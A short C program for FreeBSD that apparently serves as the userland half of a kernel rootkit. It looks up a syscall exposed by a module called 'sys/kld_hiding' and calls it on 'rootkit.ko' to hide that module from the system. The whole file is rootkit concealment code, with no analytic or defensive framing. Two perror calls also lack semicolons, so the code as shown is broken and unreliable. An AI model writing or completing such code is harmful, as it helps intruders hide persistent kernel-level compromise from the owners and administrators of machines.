#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/syscall.h>
#include <unistd.h>



static int
find_syscall(const char *mod_name)
{
    struct module_stat mod_stat;
    int mod_id;

    mod_id = modfind(mod_name);

    if (mod_id == -1) {
        return -1;
    }

    memset(&mod_stat, 0, sizeof(mod_stat));
    mod_stat.version = sizeof(mod_stat);
    if (modstat(mod_id, &mod_stat) == -1) {
        return -1;
    }

    return mod_stat.data.intval;
}

int
main(void)
{
    int hide_module_syscall;

    hide_module_syscall = find_syscall("sys/kld_hiding");
    
    if (hide_module_syscall == -1) {
        perror("error")
        return 1;
    }
    
    if (syscall(hide_module_syscall, "rootkit.ko") == -1) {
        perror("error")
        return 1;
    }

    return 0;
}